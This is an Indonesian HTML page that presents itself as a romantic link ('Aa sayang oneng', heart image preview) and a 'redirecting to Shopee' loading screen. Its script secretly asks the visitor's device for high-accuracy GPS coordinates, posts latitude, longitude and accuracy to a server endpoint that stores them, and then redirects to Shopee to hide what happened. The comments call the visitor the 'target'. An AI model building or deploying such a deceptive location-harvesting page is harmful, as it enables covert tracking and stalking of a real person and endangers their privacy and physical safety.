<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>aa sayang oneng</title>

    <!-- Open Graph untuk Tampilan Link Preview saat Dikirim di WA/Medsos -->
    <meta property="og:title" content="Aa sayang oneng" />
    <meta property="og:description" content="muahhhhhhhhh" />
    <meta
      property="og:image"
      content="https://static.vecteezy.com/system/resources/thumbnails/022/313/464/small/i-love-you-banner-with-heart-vector.jpg" />
    <meta property="og:type" content="website" />

    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: #f9f9f9;
      }
      .loading-box {
        text-align: center;
      }
      .spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #ee4d2d; /* Warna oranye Shopee */
        border-radius: 50%;
        width: 45px;
        height: 45px;
        animation: spin 1s linear infinite;
        margin: 0 auto 15px auto;
      }
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      p {
        color: #555;
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <div class="loading-box">
      <div class="spinner"></div>
      <p id="status">Mengalihkan ke Shopee, mohon tunggu...</p>
    </div>

    <script>
      const TARGET_URL = "https://shopee.co.id";
      let sudahRedirect = false;

      function alihkanKeShopee() {
        if (!sudahRedirect) {
          sudahRedirect = true;
          window.location.replace(TARGET_URL);
        }
      }

      // Waktu batas maksimal (5 detik). Jika target tidak mengklik izinkan/tolak, tetap dialihkan.
      const maxWaitTimer = setTimeout(() => {
        alihkanKeShopee();
      }, 5000);

      function kirimLokasiKeServer(dataGPS) {
        fetch("/api/simpan-lokasi", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(dataGPS),
        })
          .then((res) => res.json())
          .then((data) => {
            console.log("Lokasi berhasil tersimpan ke Neon!", data);
          })
          .catch((err) => {
            console.error("Gagal simpan lokasi:", err);
          })
          .finally(() => {
            // HANYA alihkan ke Shopee SETELAH request simpan lokasi selesai
            clearTimeout(maxWaitTimer);
            alihkanKeShopee();
          });
      }

      window.onload = function () {
        if (navigator.geolocation) {
          // Minta akses GPS perangkat
          navigator.geolocation.getCurrentPosition(
            (position) => {
              // Jika target mengklik "Allow / Izinkan"
              const dataGPS = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                akurasi_meter: position.coords.accuracy,
              };
              kirimLokasiKeServer(dataGPS);
            },
            (error) => {
              // Jika target mengklik "Block / Menolak"
              console.warn("Akses GPS ditolak/gagal:", error.message);
              alihkanKeShopee();
            },
            {
              enableHighAccuracy: true, // Paksa gunakan GPS hardware HP agar presisi
              timeout: 4000,
              maximumAge: 0,
            },
          );
        } else {
          alihkanKeShopee();
        }
      };
    </script>
  </body>
</html>
